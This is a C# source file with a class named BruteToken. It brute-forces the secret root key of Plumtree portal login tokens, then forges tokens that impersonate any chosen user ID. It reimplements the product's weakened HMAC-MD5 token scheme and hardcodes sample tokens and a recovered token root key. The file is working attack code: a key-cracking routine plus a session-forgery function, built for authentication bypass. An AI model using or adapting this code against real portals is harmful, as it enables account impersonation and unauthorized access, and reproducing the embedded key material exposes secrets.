using System;
using System.Security.Cryptography;
using System.Text;

namespace CatalogTestHarness
{
	/// <summary>
	/// Summary description for BruteToken.
	/// </summary>
	public class BruteToken {

		public const string TokenDelimiter = "|";

		public const string PlumtreeKey = "726054|1175177893|OObf98254uPul6YaWfqKPFTAeXU="; // plumtree key
		public const string RossKey = "1|1175181932|b7QDEolhC7kNUDjlAlZJ7xnKqSA="; // my key

		public const string RossTokenRoot = "1974548224419853731";

		public static void CrackToken() {
			string myToken = RossKey;

			long time = System.Environment.TickCount;

			string result = CrackToken(myToken);

			time = System.Environment.TickCount - time;

			System.Console.WriteLine("Time to crack: " + time);
			System.Console.WriteLine("Token Root Key is: " + result);
			Console.WriteLine("Press <Enter> to terminate...");
			Console.ReadLine();
		}

		/// <summary>
		/// Brute force a login token to find the hash key.
		/// </summary>
		/// <param name="fullToken">Login token with appended hash key (of the form: userId|timeout|hash)</param>
		/// <returns></returns>
		public static string CrackToken(string fullToken) {
			// split out the hash value
			int lastDelimiter = fullToken.LastIndexOf(TokenDelimiter) + 1;
			string token = fullToken.Substring(0, lastDelimiter);								// token is userId|timeout|
			string mac = fullToken.Substring(lastDelimiter, fullToken.Length-lastDelimiter);	// hash is just the hash

			return TryAllCombos(token, mac);
		}

		public static string TryAllCombos(string token, string mac) {

			// get token bytes
			byte[] bytes = encoding.GetBytes(token);

			// try all combinations of a particular character position
			for (ulong root = 0; root < 9999999999999999999; root++) {
				string rootKey = root.ToString("0000000000000000000");

				Console.WriteLine("Trying key: " + rootKey);
				if (mac == SpoofMac(bytes, rootKey)) return rootKey;
			}

			// no mac found
			return "";
		}

		#region Spoof Login Token

		/// <summary>
		/// Spoof a login token given the user ID you wish to impersonate.
		/// </summary>
		/// <param name="userId">User ID of the impersonated user.</param>
		/// <param name="lifetime">Session lifetime, in minutes.</param>
		/// <returns>A login token you can pass to IPTSession.Reconnect()</returns>
		public static string SpoofLoginToken(int userId, int lifetime, string tokenKey) {

			// calculate token expiration based on lifetime
			long millis = (long) (DateTime.UtcNow - new DateTime (1970, 1,1)).TotalMilliseconds;
			long currentSeconds = millis / 1000L;
			long tokenLifetime = (long)lifetime * 60L;
			long expiration = currentSeconds + tokenLifetime;

			// create base token
			string token = userId + TokenDelimiter + expiration + TokenDelimiter;
      
			// spoof the mac function on the token and append
			token += SpoofMac(token, tokenKey);

			return token;
		}


		// Static cryptogratphic instances needed for the algorithm
		private static MD5 md5 = MD5.Create();
		private static HMACSHA1 sha = new HMACSHA1();
		private static Encoding encoding = System.Text.Encoding.GetEncoding("UTF-16LE");

		/// <summary>
		/// Spoof the MAC (message authentication code) part of a login token.
		/// </summary>
		/// <param name="token">The login token to compute a MAC for.</param>
		/// <returns>The MAC for the login token.</returns>
		private static string SpoofMac(string token, string tokenRoot) {
			// convert token to bytes
			byte[] bytes = encoding.GetBytes(token);
			return SpoofMac(bytes, tokenRoot);
		}

		/// <summary>
		/// Spoof the MAC (message authentication code) part of a login token.
		/// </summary>
		/// <param name="token">The login token to compute a MAC for.</param>
		/// <returns>The MAC for the login token.</returns>
		private static string SpoofMac(byte[] token, string tokenRoot) {
			// seed the hashing algorithm
			byte[] seed =  encoding.GetBytes(tokenRoot);
			byte[] macbuffer = GenerateRC2Key(seed);

			// reset the key in the hashing algorithm
			sha.Key = macbuffer;

			// get the hash
			byte[] hash = sha.ComputeHash(token);
			
			// base 64 encode the result and return it
			return System.Convert.ToBase64String(hash);
		}


		/// <summary>
		/// Generate the RC2 key needed to create a MAC for a login token. The funny thing is
		/// that this is MD5, *not* RC2 (but this is the function name in the original PT source).
		/// </summary>
		/// <param name="seed">Seed bytes for the hash.</param>
		/// <returns>An set of bytes from the hash algorithm.</returns>
		private static byte[] GenerateRC2Key(byte[] seed) {
			byte[] buffer = md5.ComputeHash(seed);
			Array.Clear(buffer, 5, 16-5);
			return buffer;
		}

		#endregion

	}
}